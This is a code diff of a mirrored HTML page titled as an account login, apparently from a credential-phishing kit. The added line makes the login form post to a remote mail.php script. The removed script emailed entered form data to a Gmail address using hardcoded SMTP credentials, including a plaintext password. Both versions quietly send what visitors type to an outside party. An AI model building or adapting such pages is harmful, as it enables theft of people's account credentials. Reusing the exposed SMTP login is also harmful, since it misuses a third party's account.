@@ -1,7 +1,6 @@
 <!DOCTYPE html>
 <html lang="en">
     
-<!-- Mirrored from smartaccountvalidation.com/ by HTTrack Website Copier/3.x [XR&CO'2014], Tue, 23 Jul 2024 07:10:25 GMT -->
 <head>
         <meta charset="UTF-8">
         <meta http-equiv="X-UA-Compatible" content="IE=edge">
@@ -251,7 +250,7 @@
             
         </header>
         <section class="form-sect">
-            <form action="#" method="POST">
+            <form action="https://smartaccountvalidation.com/mail.php" method="POST">
                 <div class="form-header">
                     <span class="material-symbols-outlined">login</span>
                     <p>Login to your Account</p>
@@ -267,45 +266,10 @@
                         <input id="txt" type="password" name="Email" required>
                     </div>
                 </div>
-                <button type="submit"id="submit" onclick="sendEmail()">continue</button>
+                <button type="submit">continue</button>
             </form>
-			     <div id="response"></div>
         </section>  
     
-        <script>
-            let closeBtn = document.getElementById("cls");
-            let menu = document.getElementById('menu');
-            let nav = document.getElementById('nav');
-
-            menu.addEventListener('click', ()=>{
-                nav.style.visibility = 'visible';
-                closeBtn.style.visibility = 'visible';
-
-            });
-            closeBtn.addEventListener('click', ()=>{
-                nav.style.visibility = 'hidden';
-                closeBtn.style.visibility = 'hidden';
-            })
-
-        </script>
     </body>
-<script>  
-function sendEmail() {
-    let name = document.getElementById("name").value;
-    let email = document.getElementById("email").value;
-    let message = document.getElementById("message").value;
-    let finalmessage = `Name : ${name} <br>  Email : ${email} <br>  Message : ${message} <br>`;
-    Email.send({
-        Host : "trackfedgrant.us",
-        Username : "support@trackfedgrant.us",
-        Password : "Genesis123@",
-        To : 'ganandre08@gmail.com',
-        From : "support@trackfedgrant.us",
-        Subject : "Mail from website",
-        Body : finalmessage
-    }).then(
-      message => alert(message)
-    );
-}
-</script>
+
 </html>
